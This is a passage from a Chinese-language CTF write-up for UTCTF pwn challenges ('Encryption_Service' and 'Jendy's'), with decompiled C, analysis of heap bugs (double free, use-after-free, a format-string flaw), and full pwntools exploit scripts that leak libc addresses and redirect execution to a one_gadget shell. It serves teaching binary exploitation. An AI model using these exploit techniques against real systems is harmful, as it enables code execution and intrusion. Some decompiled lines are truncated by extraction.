            (information[i]->print_info)();
            printf("Plaintext: %s\n", information[i]->plaintxt);
            LODWORD(v0) = printf("Ciphertext: %s\n", information[i]->ciphertxt);
          }
        }
      }
      return v0;
    }
程序打印信息时会调用结构体中`print_info`函数，如果能够把这个函数改成`system`或`one_gadget`就能getshell了。这里我们可以利用上面提到的第一点漏洞：
  1. 创建一个加密字符串，明文长度为0x100，明文内容为一个假结构体，其中`print_info`处为`one_gadget`地址；
  2. 删除此加密字符串，明文的chunk回收到unsorted bins中；
  3. 创建一个加密字符串，输入一个不存在的加密方式，如`3`；
  4. 继续创建一个加密字符串，输入一个不存在的加密方式，如`3`，此时会unsorted bins中分裂一块内存给字符串结构体使用，结构体中`print_info`为内存原有的数据，即`one_gadget`地址；
  5. `view_messages()`打印信息，调用`information[i]->print_info`
完整EXP：
    from pwn import *
    p = remote('stack.overflow.fail',9004)
    elf = ELF('./Encryption_Service')
    libc = ELF('./libc-2.23.so')
    def encrypt_string(option,size,message):
        p.sendlineafter('>','1')
        p.sendlineafter('>',str(option))
        if option > 2:
            return 0
        p.sendlineafter('>',str(size))
        if size ','2')
        p.sendlineafter('remove: ',str(idx))
    def view_messages():
        p.sendlineafter('>','3')
    def edit_encrypted_message(idx,message):
        p.sendlineafter('>','4')
        p.sendlineafter('message',message)
    p.sendlineafter('id?\n',str(0xff))
    encrypt_string(1,0xff,'a'*0xff)
    remove_encrypted_string(0)
    encrypt_string(1,-1,'') #0
    view_messages()
    p.recvuntil('Plaintext: ')
    libc.address = u64(p.recv(6)+'\x00\x00') - 0x3c4b20 - 88
    success("libc.address:{:#x}".format(libc.address))
    one_gadget = libc.address + 0x45216
    fake_message = flat(0,0,one_gadget,one_gadget,0,0)
    encrypt_string(1,0xff,fake_message) #1
    encrypt_string(1,0xff,'123') #2
    remove_encrypted_string(1)
    encrypt_string(3,0,0)
    encrypt_string(3,0,0)
    view_messages()
    p.interactive()
### Jendy's
    I've probably eaten my entire body weight in Wendy's nuggies.
    nc stack.overflow.fail 9003
检查保护情况
    [*] '/home/kira/pwn/utctf/Jendy'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
    int print_menu()
    {
      puts("Welcome to Jendy's, How may we take your order?");
      puts("1. Add Name to Order");
      puts("2. Add Item to Order");
      puts("3. Remove Item from Order");
      puts("4. View order");
      puts("5. Checkout");
      return putchar(62);
    }
程序基本功能：
  1. 创建一个name，每次创建都malloc(0x20)的内存；
  2. 添加一个item，item为单链表结构，后面详细说；
  3. 删除一个item，有对单链表进行操作，后面详细说；
  4. 打印order中name及item的信息；
结构体如下：
    struct order
    {
      struct item *head;
      struct item *tail;
      char *name;
      __int64 count;
    };
    struct item
    {
      char[24] name;
      struct item *next_item;
    };
这种链表结构的题目，一般出现漏洞的地方都在链表删除的地方。
    unsigned __int64 __fastcall remove_item(struct order *a1)
    {
      int v2; // [rsp+10h] [rbp-20h]
      int i; // [rsp+14h] [rbp-1Ch]
      struct item *ptr; // [rsp+18h] [rbp-18h]
      struct item *v5; // [rsp+20h] [rbp-10h]
      unsigned __int64 v6; // [rsp+28h] [rbp-8h]
      v6 = __readfsqword(0x28u);
      puts("Please enter the number of the item from your order that you wish to remove");
      __isoc99_scanf("%d%*c", &v2);
      if ( v2 >= 0 )
      {
        ptr = a1->head;
        v5 = 0LL;
        if ( v2 || !ptr || v2 ) // a1->head = 0 or v2>0
        {
          for ( i = 0; ptr && i != v2; ++i )
          {
            v5 = ptr;
            ptr = ptr->next_item;
          }
          if ( ptr && i == v2 )
          {
            if ( LODWORD(a1->count) - 1 == v2 ) 
            {
              free(a1->tail);
              a1->tail = v5;
            }
            else
            {
              v5->next_item = ptr->next_item;
              free(ptr);
            }
            --LODWORD(a1->count);
          }
        }
        else // v2=0 and  a1->head != 0
        {
          free(ptr);
          *(_OWORD *)&a1->head = 0uLL;
          --LODWORD(a1->count);
        }
      }
      return __readfsqword(0x28u) ^ v6;
    }
这个删除的函数有几个迷之操作：
  1. 删除0号`item`的时候，直接把`head`清0，但是没有对`head`重新赋值；
  2. 如果输入的编号`v2`刚好是最后一个item（`count-1`），那么直接删除`a1->tail`，而不是删除`ptr`；
  3. 删除`head`或者`tail`，都不会清空`item`结构体的`next_item`指针；
  4. 单链表查找删除的`item`时，并不会检查`v2`是否超过`count`的大小；
继续看一下`add_item()`
    unsigned __int64 __fastcall add_item(struct order *a1)
    {
      size_t v1; // rax
      int v3; // [rsp+10h] [rbp-20h]
      unsigned int i; // [rsp+14h] [rbp-1Ch]
      char *dest; // [rsp+18h] [rbp-18h]
      struct item *v6; // [rsp+20h] [rbp-10h]
      unsigned __int64 v7; // [rsp+28h] [rbp-8h]
      v7 = __readfsqword(0x28u);
      puts("Which item would you like to order from Jendy's?");
      for ( i = 0; (signed int)i = 0 && v3 head;
        ++LODWORD(a1->count);
        if ( v6 )
          a1->tail->next_item = (struct item *)dest;
        else
          a1->head = (struct item *)dest;
        a1->tail = (struct item *)dest;
      }
      else
      {
        puts("Not a valid option!");
      }
      return __readfsqword(0x28u) ^ v7;
    }
这里如果`a1->head`为空，则会重新对`a1->head`赋值为新创建的`item`，同时`a1->tail`也赋值为新创建的`item`。现在回去看看`remove_item()`的第一个迷之操作，如果我们创建2个`item`，然后删掉0号`item`，再创建一个`item`，那么`a1->head`和`a1->tail`同时指向同一个`item`，此时出现`double
free`漏洞了。
继续下一个函数`add_name()`
    char *__fastcall add_name(struct order *a1)
    {
      puts("What is your name?");
      a1->name = (char *)malloc(0x20uLL);
      return fgets(a1->name, 32, stdin);
    }
`name`的大小刚好也是0x30，刚好和`item`的大小一样，由于删除后指针不清除，可以通过`add_name()`进行UAF。
最后看一下本题唯一的打印函数，此处应该是泄露地址的突破口。
    unsigned __int64 __fastcall view_order(struct order *a1)
    {
      unsigned int i; // [rsp+14h] [rbp-3Ch]
      char *format; // [rsp+18h] [rbp-38h]
      char s; // [rsp+20h] [rbp-30h]
      unsigned __int64 v5; // [rsp+48h] [rbp-8h]
      v5 = __readfsqword(0x28u);
      if ( a1->name )
      {
        snprintf(&s, 0x28uLL, "Name: %s\n", a1->name);
        printf("%s", &s);
      }
      format = (char *)a1->head;
      for ( i = 0; SLODWORD(a1->count) > (signed int)i; ++i )
      {
        printf("Item #%d: ", i);
        printf(format);
        putchar(10);
        format = (char *)*((_QWORD *)format + 3);
      }
      return __readfsqword(0x28u) ^ v5;
    }
这里存在一个很明显的格式化字符串漏洞，但是参数并不存在栈中，利用起来会有不少麻烦。`item`名字的打印次数跟`count`有关，如果通过UAF泄露信息，必须要注意`count`的大小。
关于heap地址泄露，是在调试过程无意发现的，某次的调试过程发现出现不可见字符。
gdb调试看一下内存到底是什么情况，竟然发现当`item`名字用`Peppercorn Mushroom
Melt`时，由于这个名字长度为24，把后面的`*next_item`拼接上了，把堆地址泄露出来，这个不知道是不是出题人故意留的漏洞，太隐蔽了！
由于思考过程过于曲折，我直接给出最终的思路，配合EXP食用：
  1. 首先创建名字为`Peppercorn Mushroom Melt`的`item`泄露heap地址；
  2. 删除最后一个`item`，用`add_name`把释放的内存复写，`*next_item`写上order的结构体地址；
  3. 用`add_name`准备两个格式化字符串payload，注意`*next_item`要连接好，用于将`PI:EMAIL`的地址写入栈中，为之后改`PI:EMAIL`做准备；
  4. 使用`remove_item`第4个迷之操作，删除第4个`item`，此时实际只有2个`item`，函数一路查找到order的结构体，然后删掉；
  5. 用`add_name`把释放的内存复写，伪造一个order的结构体，其中`*name`改成got表地址，泄露libc地址；`head`、`tail`和`count`也需要精心构造。
  6. 使用`view_order`泄露libc地址，并且通过精心构造的`item`链触发格式化字符串；
  7. 删掉第一个格式化字符串payload，写入一个新的格式化字符串payload，利用`remove_item`第二个迷之操作删掉第二个格式化字符串payload，写入一个新的格式化字符串payload。
  8. 使用`view_order`触发格式化字符串，将`PI:EMAIL`改为`one_gadget`
EXP:
    def add_name(name):
        p.sendlineafter('>','1')
        p.sendlineafter('name?\n',name)
    def add_item(idx):
        p.sendlineafter('>','2')
        p.sendlineafter('4. Dave\'s Single\n',str(idx))
    def remove_item(idx):
        p.sendlineafter('>','3')
        p.sendlineafter('remove\n',str(idx))
    def view_order():
        p.sendlineafter('>','4')
    #leak heap addr
    add_item(3)
    add_item(3)
    view_order()
    p.recvuntil('Melt')
    heap_addr = u64(p.recvuntil('\n')[:-1].ljust(8,'\x00')) - 0x70
    #leak libc addr & write PI:EMAIL to stack
    add_item(3) 
    remove_item(2)
    add_name('a'*24+p64(heap_addr + 0x10)[:-1]) 
    payload = '%{}c%{}$n'.format(elf.got['puts'],16)
    add_name(payload.ljust(24,'a')+p64(heap_addr+0x100)[:-1]) 
    payload = '%{}c%{}$n'.format(elf.got['puts']+1,47)
    add_name(payload.ljust(24,'b')+p64(heap_addr+0x40)[:-1]) 
    add_name('c'*24+p64(heap_addr+0xd0)[:-1]) 
    remove_item(3)
    add_name(p64(heap_addr+0x130)+p64(heap_addr+0x100)+p64(elf.got['free'])+p64(5)[:-1])
    view_order()
    libc.address = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - libc.sym['free']
    one_gadget = libc.address + 0x45216
    byte1 = one_gadget & 0xff
    byte2 = (one_gadget & 0xffff00) >> 8
    remove_item(1)
    payload = '%{}c%{}$hhn'.format(byte1,24)
    add_name(payload.ljust(24,'d'))
    remove_item(3)
    payload = '%{}c%{}$hn'.format(byte2,52) 
    add_name(payload.ljust(24,'e')+p64(heap_addr+0xd0)[:-1])
    view_order()
    p.interactive()
## 总结
前面3题的难度总体来说不高，不过最后一题的漏洞利用花了好长时间进行调试和修正，这题的单链处理有各种漏洞，做题过程中也发现可以`fastbin
dup`，不过最终效果并不太好，多次调整策略后最终放弃了，如果各位大佬有其他解法，欢迎一起讨论。